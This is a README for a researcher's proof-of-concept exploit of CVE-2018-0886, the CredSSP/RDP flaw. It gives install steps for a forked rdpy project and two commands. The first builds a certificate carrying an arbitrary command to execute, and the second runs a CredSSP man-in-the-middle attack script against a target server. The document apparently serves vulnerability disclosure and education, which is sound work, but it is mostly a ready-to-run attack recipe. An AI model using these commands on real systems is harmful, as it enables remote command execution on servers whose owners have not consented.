# credssp
A code demonstrating CVE-2018-0886

This is a code used for exploition this vulnerability, and it should be used for educational purposes only.
It relies on a fork of the rdpy project(https://github.com/citronneur/rdpy), allowing also credssp relay. 
The code can be found here: 

Written by Eyal Karni, Preempt 
ekarni@preempt.com 

# Build

## Instructions (Linux)
If you are using Ubuntu 14 , check the install file.. 
It was tested on Ubuntu 16.04. 

```
$ git clone https://github.com/preempt/rdpy.git rdpy
$ git clone https://github.com/preempt/credssp.git 
$ cd credssp/install
$ sh install.sh
$ cd ../../rdpy
$ sudo python setup.py install
```
* It assumes a pretty clean inital state. Best to uninstall first relevant compontants such as cryptography,pyopenssl maybe (pip uninstall cryptography).  
* A different version of openssl needed to be installed for this to run successfully.  The install script does that. 
* Please follow this instructions in the described order. 

# Running the exploit 


Export a certificate suitable for Server Authentication from any domain.


To generate a suitable certificate for the command to execute : 

```
$ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD 
```

(exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)

To run the attack script: 

```
$ python /usr/local/bin/rdpy-rdpcredsspmitm.py -k exploitk.pem -c exploitc.pem TargetServer
```

More details are in the usage section of the scripts(--help). 
